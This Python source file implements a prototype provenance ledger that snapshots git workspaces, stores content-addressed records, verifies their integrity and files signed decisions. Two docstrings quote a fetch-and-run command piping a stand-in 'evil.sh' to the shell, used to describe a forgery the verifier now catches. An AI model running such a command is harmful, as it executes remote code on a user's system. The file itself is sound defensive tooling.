#!/usr/bin/env python3
"""OAIP prototype — Observed Action & Intent Protocol.

A minimal, RUNNABLE slice of the provenance stack we sketched:

  Observer  → capture a WORKSPACE SNAPSHOT (not HEAD) before/after an action
              via git plumbing, so history isn't polluted; compute per-file
              EFFECTS (before/after content hashes) from the two snapshots.
  Ledger    → a SQLite PROJECTION over content-addressed truth. Deletable and
              rebuildable; it stores hashes + typed relations, not canon.
  Bridge    → an accepted CLAIM becomes a real, signed Warrant record — the
              decision layer, with the provenance cited as evidence and a
              validation command as a cmd@v1 check. Warrant is a normative
              dependency, not reimplemented here.

Deliberately NOT decided here (later layers): whether the action was correct,
whether the intent was met, which policy has authority, what reaction to run.

Principles it already honors:
  * before_state is a workspace snapshot (index+worktree+untracked+env/toolchain
    fingerprint), because `before_state = HEAD` lies.
  * execution success ≠ acceptance: a claim runs a SEPARATE validation check,
    and only that gates the warrant.
  * a shell command is one EFFECT/execution kind; the model is an envelope.
  * attribution here is exclusive-window (we wrap the command) → high confidence,
    recorded as parts-per-million integers (no floats).

Usage:
  oaip.py init
  oaip.py do --intent "..." --predicate p --check "<cmd>" --actor me@host -- <command...>
  # or step by step: intent / run / claim / accept
  oaip.py log
  oaip.py verify
  oaip.py conformance [vectors.json]

Stdlib only (+ the Warrant reference CLI for the bridge). Run inside a git repo.
"""
import argparse
import hashlib
import json
import os
import shutil
import sqlite3
import subprocess
import sys
import time
import uuid
from pathlib import Path

OAIP = Path(".oaip")
DB = OAIP / "ledger.db"
ART = OAIP / "artifacts"        # content-addressed artifact blobs
WSTORE = OAIP / "warrants"      # the Warrant store (canonical decision layer)
WKEY = OAIP / "dev.key"
# Warrant is a normative dependency (the decision layer). Point WARRANT_CLI at
# your `warrant.py` (or an installed `warrant`); defaults to a sibling checkout.
_wcli = os.environ.get("WARRANT_CLI")
if _wcli:
    WARRANT = _wcli.split()
else:
    _cand = Path.home() / "Projects/warrant/impl/warrant.py"
    WARRANT = [sys.executable, str(_cand)]


# ---------- content-addressed helpers ----------
def sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


# ---------- strict I-JSON ingestion (SPEC §1) ----------
# §1 says every OAIP record is canonical I-JSON "exactly per Warrant SPEC §4".
# Serialising canonically is only half of that: the other half is REFUSING input
# outside the domain, and until 2026-07-30 nothing here refused anything —
# `json.loads` was called bare on every artifact read. Stock Python accepts
# duplicate member names (last-wins), NaN/Infinity, and lone surrogates; Warrant
# rejects all three, and Go's decoder disagrees with Python on the last two. So
# the same bytes would parse to different records in different implementations
# while the SPEC claimed one domain. These are reimplemented rather than imported
# from Warrant so OAIP stands alone as an implementation — and
# `tests/ijson_parity.py` pins them against Warrant's so the copy cannot drift.
def _reject_dup_keys(pairs):
    d = {}
    for k, v in pairs:
        if k in d:
            raise ValueError(f"duplicate member name: {k}")
        d[k] = v
    return d


def _reject_constant(sym):
    raise ValueError(f"invalid I-JSON constant: {sym}")


def _reject_lone_surrogates(obj):
    """RFC 7493: every string is valid Unicode. Python keeps a `\\ud800` escape as
    a surrogate code point; Go substitutes U+FFFD — the same bytes, two different
    strings, two different hashes."""
    if isinstance(obj, str):
        for ch in obj:
            if 0xD800 <= ord(ch) <= 0xDFFF:
                raise ValueError("lone surrogate in string (invalid I-JSON)")
    elif isinstance(obj, dict):
        for k, v in obj.items():
            _reject_lone_surrogates(k)
            _reject_lone_surrogates(v)
    elif isinstance(obj, list):
        for v in obj:
            _reject_lone_surrogates(v)
    return obj


def _reject_floats(obj, path="$"):
    """§1: "integers only (no floats anywhere)". Warrant enforces this per typed
    field in `validate_body`; OAIP had no schema layer at all, so it is enforced
    here at the domain boundary — a float `ts` or a fractional `confidence_ppm`
    is outside the format, not a value to round."""
    if isinstance(obj, float):
        raise ValueError(f"float at {path}: SPEC §1 permits integers only")
    if isinstance(obj, dict):
        for k, v in obj.items():
            _reject_floats(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _reject_floats(v, f"{path}[{i}]")
    return obj


def loads_ijson(raw):
    """`json.loads` restricted to the domain SPEC §1 actually declares.

    The BOM case is a deliberate narrowing, not a grammar violation: RFC 8259 §8.1
    lets a receiver ignore a leading byte order mark, and "MAY" is unaffordable in
    a content-addressed format — the same record would arrive as two byte strings
    with two different addresses. Measured: Python's `json.loads` strips a BOM from
    BYTES and returns the record, Go's `encoding/json` rejects it. This mattered
    here and not in Warrant: `read_artifact` passes raw bytes, so the BOM was
    genuinely accepted, whereas every Warrant call site passes a `str`, where
    `json.loads` already fails. The reject vector recorded it as
    "ACCEPTED — must be refused" before this line existed."""
    bom = b"\xef\xbb\xbf" if isinstance(raw, (bytes, bytearray)) else "﻿"
    if raw[:len(bom)] == bom:
        raise ValueError("leading byte order mark (not canonical I-JSON)")
    return _reject_floats(_reject_lone_surrogates(
        json.loads(raw, object_pairs_hook=_reject_dup_keys,
                   parse_constant=_reject_constant)))


def read_artifact(path: Path):
    """Load an artifact, refusing bytes that do not hash to their own address.

    THE DEFECT THIS CLOSES (found 2026-07-30)
    -----------------------------------------
    `.oaip/artifacts` IS the canonical layer: SPEC §5 ends "the projection is
    disposable; the content-addressed causal graph is the truth." Every reader
    used bare `json.loads(path.read_bytes())` and never recomputed the address,
    so editing a file in place silently rewrote the truth. Demonstrated: an
    execution record's `command` was changed to `sh -c curl evil.sh|sh`,
    `rebuild` reported success, and the projection asserted the forged command
    while the file still sat under its original name. Content-addressed storage
    whose reader never checks the address is not content-addressed; it is a
    directory of files with long names.

    Returns (doc, error). `doc` is None when the artifact must not be used.
    """
    raw = path.read_bytes()
    if path.name != sha256(raw):
        return None, (f"{path.name[:12]}: bytes hash to {sha256(raw)[:12]} — "
                      "artifact does not match its own address")
    try:
        doc = loads_ijson(raw)
    except json.JSONDecodeError:
        # A transcript or a plain blob, not a record. Must be caught BEFORE
        # ValueError: JSONDecodeError subclasses it, so the wider clause first
        # would report every non-JSON artifact as a canonicalization failure.
        return None, None
    except ValueError as e:
        return None, f"{path.name[:12]}: not canonical I-JSON: {e}"
    return doc, None


def canon(obj) -> bytes:
    """RFC 8785 (JCS) I-JSON, EXACTLY per Warrant SPEC §4 (SPEC §1): sorted keys,
    compact separators, UTF-8, integers only, raw non-ASCII (ensure_ascii=False).
    A record's identity is SHA-256 of these bytes; every OAIP implementation MUST
    agree on them, so this must match Warrant's canonicalization byte-for-byte."""
    return json.dumps(obj, sort_keys=True, separators=(",", ":"),
                      ensure_ascii=False).encode("utf-8")


def put_artifact(data: bytes, kind: str) -> str:
    ART.mkdir(parents=True, exist_ok=True)
    h = sha256(data)
    p = ART / h
    if not p.exists():
        p.write_bytes(data)
    con = db()
    con.execute("INSERT OR IGNORE INTO artifacts(hash, kind, size) VALUES (?,?,?)",
                (h, kind, len(data)))
    con.commit()
    return h


def kid() -> str:
    # time-sortable-ish id (uuid7 not in stdlib; use ts + short uuid)
    return f"{int(time.time()*1000):013d}-{uuid.uuid4().hex[:8]}"


# ---------- git plumbing: the workspace snapshot ----------
def git(*args, **kw) -> str:
    r = subprocess.run(["git", *args], capture_output=True, text=True, **kw)
    if r.returncode != 0:
        raise RuntimeError(f"git {' '.join(args)}: {r.stderr.strip()}")
    return r.stdout.strip()


def workspace_snapshot() -> str:
    """Content-addressed tree of the FULL worktree (tracked + staged + untracked),
    built in a throwaway index so `git log` is never touched. This is the honest
    `before_state`/`after_state`, unlike HEAD.

    `.oaip/` is NEVER part of the snapshot. Until 2026-07-30 it was: `git add -A`
    into the throwaway index wrote `.oaip/dev.key` — the Ed25519 SIGNING KEY —
    as a loose blob into `.git/objects` of any repo whose .gitignore did not
    already exclude `.oaip/` (a fresh `git init` + `oaip init` was enough).
    A throwaway index does not mean throwaway objects: `git add` writes blobs
    to the object database, where they sit recoverable by hash and travel with
    any clone/push that reaches them. The observer must not exfiltrate its own
    key custody into the thing it observes; nor is the ledger/store part of the
    observed workspace — a snapshot that contains the observation machinery
    changes whenever the machinery does, which is the observer effect, not
    provenance. The exclusion is done here with a pathspec (not .gitignore) so
    it holds in every repo regardless of user configuration."""
    tmp_index = OAIP / "tmp.index"
    env = dict(os.environ, GIT_INDEX_FILE=str(tmp_index.resolve()))
    # seed the throwaway index from HEAD if it exists, else empty, then add all
    subprocess.run(["git", "read-tree", "HEAD"], env=env, capture_output=True)
    subprocess.run(["git", "add", "-A", "--", ".", ":(exclude).oaip"],
                   env=env, capture_output=True)
    # If HEAD itself tracks .oaip (a user committed it before init learned to
    # gitignore it), read-tree seeded those entries; drop them so no tree this
    # function writes ever contains the key or the store.
    subprocess.run(["git", "rm", "-r", "-q", "--cached", "--ignore-unmatch",
                    "--", ".oaip"], env=env, capture_output=True)
    tree = subprocess.run(["git", "write-tree"], env=env, capture_output=True, text=True).stdout.strip()
    tmp_index.unlink(missing_ok=True)
    return tree


def env_fingerprint() -> str:
    manifest = {
        "uname": subprocess.run(["uname", "-sm"], capture_output=True, text=True).stdout.strip(),
        "git": git("--version"),
        "python": sys.version.split()[0],
    }
    return sha256(json.dumps(manifest, sort_keys=True).encode())


def effects_between(before_tree: str, after_tree: str):
    """Per-file mutations: (path, status, before_blob, after_blob) via diff-tree."""
    out = git("diff-tree", "-r", "--no-commit-id", before_tree, after_tree)
    for line in out.splitlines():
        if not line:
            continue
        meta, path = line.split("\t", 1)
        _, _, before_blob, after_blob, status = meta.split()[:5]
        zero = "0" * 40
        yield {
            "path": path,
            "status": {"A": "created", "M": "modified", "D": "deleted"}.get(status[0], status),
            "before_blob": None if before_blob == zero else before_blob,
            "after_blob": None if after_blob == zero else after_blob,
        }


# ---------- ledger (SQLite projection) ----------
def db():
    con = sqlite3.connect(DB)
    con.execute("PRAGMA foreign_keys=ON")
    return con


SCHEMA = """
CREATE TABLE IF NOT EXISTS intents(
  id TEXT PRIMARY KEY, description TEXT NOT NULL, parent_id TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS executions(
  id TEXT PRIMARY KEY, intent_id TEXT, command TEXT NOT NULL, exit_code INTEGER,
  before_tree TEXT, after_tree TEXT, env_fp TEXT, stdout_hash TEXT, created_at INTEGER);
CREATE TABLE IF NOT EXISTS effects(
  id INTEGER PRIMARY KEY AUTOINCREMENT, execution_id TEXT, path TEXT, status TEXT,
  before_blob TEXT, after_blob TEXT);
CREATE TABLE IF NOT EXISTS artifacts(
  hash TEXT PRIMARY KEY, kind TEXT, size INTEGER);
CREATE TABLE IF NOT EXISTS attributions(
  effect_id INTEGER, cause TEXT, method TEXT, confidence_ppm INTEGER);
CREATE TABLE IF NOT EXISTS claims(
  id TEXT PRIMARY KEY, execution_id TEXT, predicate TEXT, check_cmd TEXT,
  check_exit INTEGER, transcript_hash TEXT, subject_hash TEXT, supported INTEGER, created_at INTEGER);
CREATE TABLE IF NOT EXISTS warrants(
  claim_id TEXT, warrant_id TEXT, created_at INTEGER);
"""


# ---------- commands ----------
def cmd_init(_):
    OAIP.mkdir(exist_ok=True)
    db().executescript(SCHEMA)
    subprocess.run(WARRANT + ["--store", str(WSTORE), "init"], capture_output=True)
    if not WKEY.exists():
        subprocess.run(WARRANT + ["keygen", "--out", str(WKEY)], capture_output=True)
    # Keep the signing key and the store out of the USER's own commits too.
    # workspace_snapshot() excludes .oaip by pathspec, but a plain `git add -A`
    # by the user would still commit dev.key; init owns the directory, so init
    # owns keeping it ignored. Idempotent: never duplicates the line.
    gitignore = Path(".gitignore")
    lines = gitignore.read_text().splitlines() if gitignore.exists() else []
    if ".oaip/" not in (l.strip() for l in lines):
        with gitignore.open("a") as f:
            if lines and not gitignore.read_text().endswith("\n"):
                f.write("\n")
            f.write(".oaip/\n")
    print(f"initialized .oaip (ledger + warrant store + dev key)")


def cmd_intent(a):
    i = kid()
    con = db()
    ts = int(time.time())
    # SPEC §5 is a MUST: the canonical layer is content-addressed artifacts plus the
    # Warrant store, and the SQLite index is a PROJECTION that must be rebuildable
    # from it. Records used to exist only as rows -- so deleting the projection
    # destroyed the invocation, the exit code, the state snapshots, the environment
    # fingerprint and the intent link, none of which appeared anywhere
    # content-addressed. Demonstrated 2026-07-30 by deleting ledger.db. The
    # projection was the source of truth, which is the one thing §5 forbids, and
    # the opposite of the SPEC's own closing line.
    put_artifact(canon({"oaip_record": "intent@v1", "id": i,
                        "description": a.description, "parent": a.parent,
                        "ts": ts}), "record:intent")
    con.execute("INSERT INTO intents(id, description, parent_id, created_at) VALUES (?,?,?,?)",
                (i, a.description, a.parent, ts))
    con.commit()
    print(i)
    return i


def cmd_run(a):
    before = workspace_snapshot()
    env_fp = env_fingerprint()
    proc = subprocess.run(a.command, capture_output=True, text=True)
    after = workspace_snapshot()
    stdout_hash = put_artifact((proc.stdout + proc.stderr).encode(), "stdout")
    eid = kid()
    con = db()
    ts = int(time.time())
    effects = list(effects_between(before, after))
    # One canonical artifact carrying the execution AND its effects and
    # attributions, so the whole causal step survives the projection (§5).
    put_artifact(canon({
        "oaip_record": "execution@v1", "id": eid, "intent": a.intent,
        "command": " ".join(a.command), "exit_code": proc.returncode,
        "before_tree": before, "after_tree": after, "env_fp": env_fp,
        "stdout": stdout_hash, "ts": ts,
        "effects": [{"path": e["path"], "status": e["status"],
                     "before": e["before_blob"], "after": e["after_blob"],
                     # Attribution travels with the effect it explains: a causal
                     # claim separated from what it explains is not recoverable.
                     "attribution": {"cause": eid,
                                     "method": "exclusive-command-window",
                                     "confidence_ppm": 999000}}
                    for e in effects],
    }), "record:execution")
    con.execute("""INSERT INTO executions(id,intent_id,command,exit_code,before_tree,after_tree,
                   env_fp,stdout_hash,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (eid, a.intent, " ".join(a.command), proc.returncode, before, after,
                 env_fp, stdout_hash, ts))
    n = 0
    for e in effects:
        cur = con.execute("""INSERT INTO effects(execution_id,path,status,before_blob,after_blob)
                             VALUES (?,?,?,?,?)""",
                          (eid, e["path"], e["status"], e["before_blob"], e["after_blob"]))
        # exclusive-window attribution: we wrapped the command -> high confidence
        con.execute("INSERT INTO attributions(effect_id,cause,method,confidence_ppm) VALUES (?,?,?,?)",
                    (cur.lastrowid, eid, "exclusive-command-window", 999000))
        n += 1
    con.commit()
    print(f"execution {eid}  exit={proc.returncode}  effects={n}  before={before[:10]} after={after[:10]}")
    return eid


def cmd_claim(a):
    con = db()
    ex = con.execute("SELECT id FROM executions WHERE id=?", (a.execution,)).fetchone()
    if not ex:
        sys.exit(f"no execution {a.execution}")
    # validation check — SEPARATE from execution success (exit_code=0 earns nothing)
    chk = subprocess.run(a.check, shell=True, capture_output=True, text=True)
    transcript_hash = put_artifact((chk.stdout + chk.stderr).encode(), "check-transcript")
    supported = 1 if chk.returncode == 0 else 0
    # content-addressed claim subject (what the decision is ABOUT)
    subject = {
        "oaip_subject": "claim@v1",
        "predicate": a.predicate,
        "execution": a.execution,
        "effects": [dict(path=r[0], status=r[1], after=r[2]) for r in
                    con.execute("SELECT path,status,after_blob FROM effects WHERE execution_id=?",
                                (a.execution,)).fetchall()],
    }
    subject_hash = put_artifact(canon(subject), "claim-subject")   # JCS, SPEC §1
    cid = kid()
    # The claim record itself, not only its subject: check command, exit code,
    # verdict and transcript are the §4 evidence that execution success is not
    # acceptance, and they were projection-only until now.
    put_artifact(canon({"oaip_record": "claim@v1", "id": cid,
                        "execution": a.execution, "predicate": a.predicate,
                        "check": a.check, "check_exit": chk.returncode,
                        "supported": bool(supported), "transcript": transcript_hash,
                        "subject": subject_hash, "ts": int(time.time())}),
                 "record:claim")
    con.execute("""INSERT INTO claims(id,execution_id,predicate,check_cmd,check_exit,
                   transcript_hash,subject_hash,supported,created_at) VALUES (?,?,?,?,?,?,?,?,?)""",
                (cid, a.execution, a.predicate, a.check, chk.returncode,
                 transcript_hash, subject_hash, supported, int(time.time())))
    con.commit()
    print(f"claim {cid}  predicate={a.predicate}  check_exit={chk.returncode}  "
          f"{'SUPPORTED' if supported else 'UNSUPPORTED (check failed)'}")
    return cid, bool(supported)


def cmd_accept(a):
    """THE BRIDGE: an accepted claim becomes a signed Warrant record."""
    con = db()
    c = con.execute("""SELECT predicate,check_cmd,check_exit,transcript_hash,subject_hash,supported
                       FROM claims WHERE id=?""", (a.claim,)).fetchone()
    if not c:
        sys.exit(f"no claim {a.claim}")
    predicate, check_cmd, check_exit, transcript_hash, subject_hash, supported = c
    if not supported:
        sys.exit("refusing to accept: the claim's validation check did NOT pass "
                 "(execution success is not acceptance)")
    # materialize the subject + policy + check blob + transcript as warrant blobs
    w = lambda *args: subprocess.run(WARRANT + ["--store", str(WSTORE), *args],
                                     capture_output=True, text=True)
    subject_bytes = (ART / subject_hash).read_bytes()
    subj_file = OAIP / "subject.tmp"
    subj_file.write_bytes(subject_bytes)
    subj = w("blob", "add", str(subj_file)).stdout.strip()
    policy = OAIP / "policy.txt"
    if not policy.exists():
        policy.write_text("OAIP decision policy v0: accept requires a passing validation check.\n")
    pol = w("blob", "add", str(policy)).stdout.strip()
    checkfile = OAIP / "check.tmp"
    checkfile.write_text(check_cmd + "\n")
    transcript_file = OAIP / "transcript.tmp"
    transcript_file.write_bytes((ART / transcript_hash).read_bytes())
    r = w("accept", "--subject", subj, "--under", pol,
          "--check", str(checkfile), "--verdict", "pass",
          "--transcript", str(transcript_file),
          "--reason", f"claim: {predicate}",
          "--actor", a.actor, "--key", str(WKEY))
    wid = r.stdout.strip()
    for f in (subj_file, checkfile, transcript_file):
        f.unlink(missing_ok=True)
    if len(wid) != 64:
        sys.exit(f"warrant filing failed: {r.stdout} {r.stderr}")
    con.execute("INSERT INTO warrants(claim_id,warrant_id,created_at) VALUES (?,?,?)",
                (a.claim, wid, int(time.time())))
    con.commit()
    print(f"ACCEPTED -> warrant {wid}\n  (signed, hash-addressed, cites the provenance as evidence "
          f"and the validation as a cmd@v1 check)")


def cmd_do(a):
    """One-shot: intent → run → validate → accept-if-pass. The ergonomic verb —
    an agent action becomes a signed decision only if its validation check
    passes, in a single command (SPEC §4)."""
    from argparse import Namespace
    i = cmd_intent(Namespace(description=a.intent, parent=None))
    eid = cmd_run(Namespace(intent=i, command=a.command))
    cid, supported = cmd_claim(Namespace(execution=eid, predicate=(a.predicate or a.intent),
                                         check=a.check))
    if supported:
        cmd_accept(Namespace(claim=cid, actor=a.actor))
    else:
        print("NOT accepted — validation check failed "
              "(execution success is not acceptance; no warrant filed)")
        sys.exit(1)


def cmd_log(_):
    con = db()
    for i in con.execute("SELECT id,description FROM intents ORDER BY id"):
        print(f"INTENT {i[0]}  {i[1]}")
        for e in con.execute("SELECT id,command,exit_code,effects_n FROM "
                             "(SELECT e.id,e.command,e.exit_code,COUNT(f.id) effects_n "
                             " FROM executions e LEFT JOIN effects f ON f.execution_id=e.id "
                             " WHERE e.intent_id=? GROUP BY e.id)", (i[0],)):
            print(f"  EXEC {e[0]}  `{e[1]}`  exit={e[2]}  effects={e[3]}")
            for c in con.execute("SELECT id,predicate,supported FROM claims WHERE execution_id=?", (e[0],)):
                sup = "supported" if c[2] else "unsupported"
                print(f"    CLAIM {c[0]}  {c[1]}  [{sup}]")
                for wr in con.execute("SELECT warrant_id FROM warrants WHERE claim_id=?", (c[0],)):
                    print(f"      WARRANT {wr[0][:16]}…  (signed decision)")


def cmd_rebuild(_):
    """Reconstruct the SQLite projection from the canonical layer alone (§5).

    The MUST this exists to make true: "Deleting the projection and rebuilding it
    from artifacts + warrants MUST yield the same graph." Until 2026-07-30 there
    was no way to attempt it, and the attempt would have failed -- the invocation,
    exit code, state snapshots and environment fingerprint lived only in rows.

    Reads ONLY .oaip/artifacts. If it needs the database to rebuild the database,
    the claim is circular and the check is worthless.
    """
    # Read and validate the canonical layer BEFORE touching the projection. A
    # fail-closed check that deletes the database and then refuses to rebuild it
    # has destroyed the thing it was protecting.
    records = []
    bad = []
    for path in sorted(ART.glob("*")):
        # An artifact whose bytes do not hash to its address is not a record with
        # a problem, it is not that record at all. Rebuilding from it would
        # launder a forgery into the projection — which is exactly what happened
        # before this check existed.
        doc, err = read_artifact(path)
        if err:
            bad.append(err)
            continue
        if isinstance(doc, dict) and isinstance(doc.get("oaip_record"), str):
            records.append(doc)
    if bad:
        for e in bad:
            print("ERR ", e, file=sys.stderr)
        sys.exit(f"refusing to rebuild: {len(bad)} corrupt artifact(s) in the "
                 "canonical layer — the projection would assert forged facts "
                 "(the existing projection has been left untouched)")

    if DB.exists():
        DB.unlink()
    con = db()
    con.executescript(SCHEMA)       # one schema definition, not a copy of it
    # Deterministic order: by timestamp then id, so a rebuild is reproducible and
    # two rebuilds of the same artifacts give the same projection.
    records.sort(key=lambda d: (d.get("ts", 0), d.get("id", "")))
    counts = {"intent@v1": 0, "execution@v1": 0, "claim@v1": 0}
    for d in records:
        kind = d["oaip_record"]
        if kind == "intent@v1":
            con.execute("INSERT OR REPLACE INTO intents(id,description,parent_id,created_at)"
                        " VALUES (?,?,?,?)", (d["id"], d.get("description"),
                                              d.get("parent"), d.get("ts")))
        elif kind == "execution@v1":
            con.execute("""INSERT OR REPLACE INTO executions(id,intent_id,command,exit_code,
                           before_tree,after_tree,env_fp,stdout_hash,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("intent"), d.get("command"), d.get("exit_code"),
                         d.get("before_tree"), d.get("after_tree"), d.get("env_fp"),
                         d.get("stdout"), d.get("ts")))
            for e in d.get("effects", []):
                cur = con.execute("""INSERT INTO effects(execution_id,path,status,
                                     before_blob,after_blob) VALUES (?,?,?,?,?)""",
                                  (d["id"], e.get("path"), e.get("status"),
                                   e.get("before"), e.get("after")))
                at = e.get("attribution") or {}
                if at:
                    con.execute("""INSERT INTO attributions(effect_id,cause,method,
                                   confidence_ppm) VALUES (?,?,?,?)""",
                                (cur.lastrowid, at.get("cause"), at.get("method"),
                                 at.get("confidence_ppm")))
        elif kind == "claim@v1":
            con.execute("""INSERT OR REPLACE INTO claims(id,execution_id,predicate,check_cmd,
                           check_exit,transcript_hash,subject_hash,supported,created_at)
                           VALUES (?,?,?,?,?,?,?,?,?)""",
                        (d["id"], d.get("execution"), d.get("predicate"), d.get("check"),
                         d.get("check_exit"), d.get("transcript"), d.get("subject"),
                         1 if d.get("supported") else 0, d.get("ts")))
        else:
            continue
        counts[kind] = counts.get(kind, 0) + 1
    # Re-register the artifacts themselves, so the index over the canonical layer
    # is complete rather than only covering what the records referenced.
    for path in sorted(ART.glob("*")):
        con.execute("INSERT OR IGNORE INTO artifacts(hash,kind,size) VALUES (?,?,?)",
                    (path.name, "rebuilt", path.stat().st_size))
    con.commit()
    print("rebuilt projection from the canonical layer: "
          + ", ".join(f"{k.split('@')[0]}={v}" for k, v in sorted(counts.items())))


def verify_artifacts():
    """Every artifact's bytes must hash to its filename, and every record must be
    canonical I-JSON. Returns a list of errors.

    Also: every hash the projection CITES must resolve. A dangling citation means
    the projection asserts a fact whose evidence is absent — reporting the graph
    as intact then is the same mistake as trusting a filename.
    """
    errs = []
    if not ART.is_dir():
        return [f"no canonical layer at {ART}"]
    present = set()
    for path in sorted(ART.glob("*")):
        doc, err = read_artifact(path)
        if err:
            errs.append(err)
        else:
            present.add(path.name)

    if DB.is_file():
        con = db()
        con.row_factory = sqlite3.Row
        cited = []
        for row in con.execute("SELECT hash FROM artifacts"):
            cited.append(("artifacts.hash", row[0]))
        for row in con.execute("SELECT id,subject_hash,transcript_hash FROM claims"):
            cited.append((f"claim {row[0]}.subject", row[1]))
            cited.append((f"claim {row[0]}.transcript", row[2]))
        for where, h in cited:
            if h and h not in present:
                errs.append(f"{where} cites {h[:12]} — not resolvable in the "
                            "canonical layer")
    return errs


def cmd_verify(_):
    """Verify the canonical layer FIRST, then the decision layer.

    WHAT THIS USED TO DO, AND WHY IT WAS WRONG
    ------------------------------------------
    It shelled out to `warrant verify` on `.oaip/warrants` and printed the last
    line — nothing else. Not one byte of `.oaip/artifacts` was examined, though
    SPEC §5 calls that layer the truth. Demonstrated 2026-07-30: with all three
    canonical records forged (`command` rewritten to `sh -c curl evil.sh|sh`),
    `oaip verify` printed "0 errors" and exited 0. It was checking the store next
    door to the evidence — a real, adjacent, healthy thing — and reporting that
    as the health of this one.
    """
    errs = verify_artifacts()
    for e in errs:
        print("ERR ", e)
    print(f"canonical layer: {len(errs)} error(s)" if errs
          else "canonical layer: every artifact matches its address")

    r = subprocess.run(WARRANT + ["--store", str(WSTORE), "verify"],
                       capture_output=True, text=True)
    print("decision layer:  " + (r.stdout.strip().splitlines()[-1]
                                 if r.stdout.strip() else "(empty store)"))
    sys.exit(1 if (errs or r.returncode != 0) else 0)


def cmd_conformance(a):
    """SPEC §1: every OAIP record MUST canonicalize (JCS, Warrant §4) to the pinned
    bytes and identity. Recompute canon over each vector and compare byte-exact."""
    doc = json.loads(Path(a.vectors).read_text(encoding="utf-8"))
    ok = 0
    total = 0
    for v in doc["records"]:
        total += 1
        got = canon(v["record"])
        good = got.hex() == v["canon_hex"] and sha256(got) == v["canon_sha256"]
        print(("OK  " if good else "FAIL"), v["name"], "" if good else f"got {sha256(got)[:12]}")
        ok += good

    # The negative half. An implementation that accepts everything passes every
    # positive vector, so agreement on well-formed records establishes nothing
    # about whether two implementations share a domain (SPEC §1).
    for v in doc.get("reject", []):
        total += 1
        raw = bytes.fromhex(v["bytes_hex"])
        try:
            loads_ijson(raw)
            rejected, why = False, "ACCEPTED — must be refused"
        except (ValueError, UnicodeDecodeError) as e:
            rejected, why = True, str(e)
        print(("OK  " if rejected else "FAIL"), f"reject/{v['class']}/{v['name']}",
              "" if rejected else why)
        ok += rejected

    tag = "ALL PASS" if ok == total else "FAILURES"
    print(f"\nOAIP-CONFORMANCE: {tag} ({ok}/{total})")
    sys.exit(0 if ok == total else 1)


def main():
    ap = argparse.ArgumentParser(prog="oaip", description=__doc__.splitlines()[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("init").set_defaults(fn=cmd_init)
    pi = sub.add_parser("intent"); pi.add_argument("description"); pi.add_argument("--parent"); pi.set_defaults(fn=cmd_intent)
    pr = sub.add_parser("run"); pr.add_argument("--intent"); pr.add_argument("command", nargs=argparse.REMAINDER); pr.set_defaults(fn=cmd_run)
    pc = sub.add_parser("claim"); pc.add_argument("--execution", required=True); pc.add_argument("--predicate", required=True); pc.add_argument("--check", required=True); pc.set_defaults(fn=cmd_claim)
    pa = sub.add_parser("accept"); pa.add_argument("--claim", required=True); pa.add_argument("--actor", required=True); pa.set_defaults(fn=cmd_accept)
    pd = sub.add_parser("do", help="one-shot: intent -> run -> validate -> accept-if-pass")
    pd.add_argument("--intent", required=True); pd.add_argument("--check", required=True)
    pd.add_argument("--predicate"); pd.add_argument("--actor", required=True)
    pd.add_argument("command", nargs=argparse.REMAINDER); pd.set_defaults(fn=cmd_do)
    sub.add_parser("log").set_defaults(fn=cmd_log)
    sub.add_parser("rebuild", help="reconstruct the projection from artifacts (SPEC s5)"
                   ).set_defaults(fn=cmd_rebuild)
    sub.add_parser("verify").set_defaults(fn=cmd_verify)
    pf = sub.add_parser("conformance"); pf.add_argument("vectors", nargs="?", default="examples/vectors.json"); pf.set_defaults(fn=cmd_conformance)
    a = ap.parse_args()
    if a.cmd in ("run", "do") and a.command and a.command[0] == "--":
        a.command = a.command[1:]
    a.fn(a)


if __name__ == "__main__":
    main()
